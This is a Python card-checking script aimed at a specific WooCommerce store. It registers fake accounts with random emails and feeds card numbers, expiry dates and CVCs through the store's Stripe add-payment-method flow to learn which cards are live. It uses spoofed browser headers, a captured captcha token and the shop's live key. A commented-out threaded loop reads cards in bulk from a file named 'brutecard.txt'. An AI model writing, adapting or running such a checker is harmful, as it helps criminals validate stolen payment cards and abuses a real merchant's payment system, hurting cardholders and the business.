import requests, re
import time
import random
import string
from threading import Thread, Lock
from queue import Queue

# Lock for thread-safe printing
print_lock = Lock()

def generate_random_account():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + ''.join(random.choices(string.digits, k=4)) + '@yahoo.com'

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase, k=2)) + ''.join(random.choices(string.digits, k=3))

acc = generate_random_account()
user = generate_username()


def Tele(ccx):
    import requests
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:
        yy = yy.split("20")[1]
    r = requests.session()

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
        'cache-control': 'max-age=0',
        'priority': 'u=0, i',
        'referer': 'https://liquidlemn.com/my-account/',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    }

    response = requests.get('https://liquidlemn.com/my-account/', headers=headers)

    nonce = re.search(r'"woocommerce-register-nonce" name="woocommerce-register-nonce" value="([^*]+)" /><input type="hidden" name="_wp_http_referer" value="/my-account/"', response.text).group(1)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://liquidlemn.com',
        'priority': 'u=0, i',
        'referer': 'https://liquidlemn.com/my-account/',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    }

    data = {
        'email': acc,
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://liquidlemn.com/my-account/',
        'wc_order_attribution_session_start_time': '2025-08-03 06:42:34',
        'wc_order_attribution_session_pages': '3',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'woocommerce-register-nonce': nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }

    response = requests.post('https://liquidlemn.com/my-account/', headers=headers, data=data)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
        'priority': 'u=0, i',
        'referer': 'https://liquidlemn.com/my-account/',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    }

    response = requests.get('https://liquidlemn.com/my-account/payment-methods/', headers=headers)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
        'priority': 'u=0, i',
        'referer': 'https://liquidlemn.com/my-account/payment-methods/',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    }

    response = requests.get('https://liquidlemn.com/my-account/add-payment-method/', headers=headers)

    ajax_nonce = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text).group(1)

    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=87121&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2F54a85a778c%3B+stripe-js-v3%2F54a85a778c%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fliquidlemn.com&time_on_page=18504&client_attribution_metadata[client_session_id]=bfdfea49-3eb3-4dac-9c44-937eac306a40&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=406a9dc8-4c6c-4304-8d4b-c1c0bc3f4977&guid=e20a3a0f-19b2-46de-a09b-f184ba215a793bf521&muid=d4472621-e458-4fd1-80c3-455fa2618fb0150fa3&sid=116376d9-54e7-4f0a-83fd-4dce8da1fe14c2f96d&key=pk_live_51QUUFhJDWkDIXZhZKyMPOSgGVEF0zX0g7s5AtODNZQVu3LQGbhT2xLx2ZXn6LcLVUa02bu6aJ6jvLkqewPRKGeeo0057gpwhlL&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzU0MjA2MDM5LCJjZGF0YSI6IjV4WHk4WXB0WVJORG9kUms4SWE2WGRncklUeEpHVWNxNVN5RWJFS3RYTVQzb3hFVzJvUzdXQ1B2T29kSFdTcUJwY3BwNGhwYXhoQjJiaEFtcGZ4RVc1ejJmbTM1U3lEVDVJZlJmM2tJVzQwTGRCWkFaN0lBRjNrd25DVVBvcDJaN3k3RlpKSnhhWjZRSUZlalJYZXJQeW1Dem56M2owOGppZWV5RVdsZm51MzRNeW5Md0VhMmZQVEQ3TGlkRm1LVWcwWmYvZk1qMDhKRG01WFAiLCJwYXNza2V5IjoieFNndE1SRm1ML1NvbkdpYlYxcWZrUEFVMGtOK0NtcEZPYUVMMWFEV0VxMjlIL0JpYXdJeTRESTc3UTRoenhjeVhlZkZicitpcG12WG1ibXpiYkFyVlI3dU9iTHk4OGlhOEdxdXViK2VabjRWKzNqS3AzZUswV0FpYkxYVFJQQ1Zla2V0NnJLeHdURlJFQXBYaXpVTUxkZzFHRFJYNlVYQ3BncDMyUjB4b3pwUkIvcFNqNlVqMHgrYzBCd0hnNkU5Q2V3cG9DZDVENko2ejFrazZGRjhzOEJwbEtwaU9kTmVLeWNBN0pLOFhNdlVKcG9rWWFnUTBDQndnTnl6aHJpSEgrVXBxOXpPLzZqMXJDUFdUTFZHUDBCcWROd0RVZkdMU1BOUUc4RHBZYnRNb3B5QyttT1lFbFZkSXNhWUFOMG9CajZyRFdaUmc0VkNqa203aUw4QjJzRkJGSTBNWHppZmp2cmc2ZVRtSmJuRlQ3VU50a2NnNktYalVvY1A0K3Y4V1NQcXNxU1UzWFliRmh5VnZzVzZGSlFEeHJoallIVnlFZDY3OSswMTB6OUFWbVYvVU42N2FvN09IVE1rZFZUN1RqUXh5c3JSc2JSL05URG5ScWQ0TkZ3cFR6YmhBcXRBcGRsKzJzODVjVVFzc0JSU0NhWFpZT1hnNmZjdUdBcUE3U0diQUFIQkNhN3hRb0thTTM0OTkzYzZjZ08xbVdTM2dVVVpqVjBtYjl5ZkFJMks0ZnUwYnJDUTRNSGhyV1c1K0FaMU9VRUovTHpvUmNSODh6MWxVOGlETG1LUkJJUTVmK2pBSTAyLzVQenFRL1Fod2ZsQjArMmdDeGxIdHhaMHZUb1hFTmwxVkRVeUZha0RUUVA1bEJGM3BIODkzU3hoclR3N0xCS3pTYSs5ZUptcFdZZGNXTXlsOGZmSmpia2Y2RHowYzA0bHNNdUFDN0lHYzF1M1BaYWd3czNqeUZ3R0RHelJzVFFzeDhaZmsybDJvbS9yUnc3L1hXUS9mRXBNNE9kdjFyUXJ5dzQ5eUJGUnJZb0ZaQkZFaU5ENVJXR2NRSlhFSEd5cEVFekd3SkxkWmtIOEtZMGNMZEdCSjhESURsdm1haGc4VVpUemY2dU8wYmEyT2pkb3h5Q2ZtcUprd2F0UEJSYWU0RThoTk14Z1J5UFUwMDFoV0N2dW52L1RPQ3RvajNJYUZTcEpxUVk1Sm0rcEdvR1o4b0JyVnZMelpDVnUwWngxSWd1dnZlWTBSV0tkOTN4V3lybFFvTHFEZ3pWTmJibDBGOUxxQUVMTWh4eTdVdUN4RjlwOFdaRUJyMkQ4NVJCRzZnbE10ZU1WMWFOKytuWlhTRlY0bmlyZVhsZEJBSHFybndrYnpKM0JwcmhEZlp3VnVRWU1LNWt1Ni9ycnlJeitoN1JtV3NzL2YzNlFtU0pvYjdiZzdTMys5eEdZVkZsRGFjSXRGNHNnbG5vQnRycUxoWFVKUmpDamtNNHA0T3lET01TaExYUWFuMFdhK3FWR1ZSa3JHMnd3L3B4VENWMEhTcmpKOG5EZXFFQkV4ZnZnZG1qNHA1NEFZdDhDeWpRc1FvRnY2UldYa2hNbXNKeDd0TXp0QU1URkQ5ZmMvSVdnZlJTVVJiZlFYNE9OVW04SkFUeWcyQkRmUWF2cUowa2UyYWJyY2pOeUpWM1dTczBiMTJLamV5MEZnYmp4ZkNoTWFWKzRmKzY5alkrbUlwV1ZwQWdNYkFJTWlvL2ozakVmVUsvS3l5bWVLVEFDNThoV1UrWEp6OXJJa0JvUlNYQWhXdU5GbTRWdjNqckVOWmtXSlNxdkVKMW5QaEdvODcvZFlxcDVjMGNhbzVmTlkvTnUvUlR4bUlxL3JhYTJlZXRaaFBOUFB5UnltNnJhaVk1dldLOE9ubEJkdjZEVHZxZUsrVWUxL1FDTE9wRXBGZDY4L2tiVW5LU2RzRzk1ZmxTNXVtQkFFVkg5dW44Zk43a2J6SFJVUVpJK3lSZ3A5RTJDdVpxaG1FeWVwTnJaditFL2oxbUQ5SzUzb1FySmRNd3g3TjgrOEpUVEdXRVV6QmszdkJQeUNDdGF4NUtxOHE3NzZUbEs2RUExRE5FR3hYc0g4RDgxWWpUMkVxY2dQRG1SWW1KSENQUUxBWHMvYkRvdGs1Rno3M05wcTZtdG5SaW5Nd3J4NTFHWjFYVE91bXE0NERlT1FkSndzTkRjeW5kelJJTUtlTFdGR25MSFpqZ1djWjYwaE14UDV2dkVBQXVscWh2SjBFVjMzanU2WVhjNEYxYXB2SFFoblltOC9BcGh4U0ZRalpjOUlxZ25XcE4zUzlkbHVrVEc3RGhOZlZLRnV3djhVUEU9Iiwia3IiOiI0ODgzNjA4YSIsInNoYXJkX2lkIjoyNTkxODkzNTl9.IuhWYjqlma14utMu4slG0R_mTzfOtpyN2AHiyXbdXag'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    data1 = response.json()

    if "id" in data1 and data1["id"]:
        pm = data1["id"]
        # proceed with pm
    else:
        return "Card is Declined (Expired)"

    pm = response.json()["id"]

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://liquidlemn.com',
        'priority': 'u=1, i',
        'referer': 'https://liquidlemn.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
    }

    data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': ajax_nonce,
    }

    response = requests.post('https://liquidlemn.com/', params=params,headers=headers, data=data)
    print(f"{n}|{mm}|{yy}|{cvc}: ",response.text)
    return response.text

# def worker(q):
#     while not q.empty():
#         ccx = q.get()
#         result = Tele(ccx)
#         with print_lock:
#             print(f"Card: {ccx.strip()} - Result: {result}")
#             print("-" * 40)
#         q.task_done()

# def check_cards_from_file(file_name, num_threads=10):
#     q = Queue()
    
#     # Read cards and put them in the queue
#     with open(file_name, 'r') as file:
#         for line in file:
#             q.put(line.strip())
    
#     # Create and start threads
#     threads = []
#     for i in range(num_threads):
#         t = Thread(target=worker, args=(q,))
#         t.start()
#         threads.append(t)
    
#     # Wait for all threads to complete
#     for t in threads:
#         t.join()

# if __name__ == "__main__":
#     check_cards_from_file('brutecard.txt')
